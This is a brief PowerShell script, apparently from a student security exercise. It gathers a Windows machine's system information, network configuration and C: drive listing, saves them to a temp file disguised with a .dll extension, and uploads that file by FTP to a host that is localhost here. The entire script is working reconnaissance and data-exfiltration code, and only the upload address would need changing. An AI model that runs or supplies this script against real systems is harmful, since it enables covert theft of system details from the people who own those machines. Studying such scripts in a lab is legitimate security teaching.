$TempDir = [System.IO.Path]::GetTempPath()
Set-Location -Path  $TempDir
$A=Get-ComputerInfo | Out-String
$B=Get-NetIPConfiguration | Out-String
$C=Get-ChildItem C:\ | Out-String

$uploadPath='info_s3848017s3868494.dll'
#Create and save a file with the resulting stored info
"System Info: $A Ip Config: $B C Drive: $C" | Out-File -FilePath $uploadPath

# create the FtpWebRequest and configure it
$ftp = [System.Net.FtpWebRequest]::Create("ftp://localhost/info_s3848017s3868494.dll")
$ftp = [System.Net.FtpWebRequest]$ftp
$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
$ftp.Credentials = new-object System.Net.NetworkCredential("test","test")
$ftp.UseBinary = $true
$ftp.UsePassive = $true
# read in the file to upload as a byte array
$content = [System.IO.File]::ReadAllBytes("$TempDir\info_s3848017s3868494.dll")
$ftp.ContentLength = $content.Length
# get the request stream, and write the bytes into it
$rs = $ftp.GetRequestStream()
$rs.Write($content, 0, $content.Length)
# be sure to clean up after ourselves
$rs.Close()
$rs.Dispose()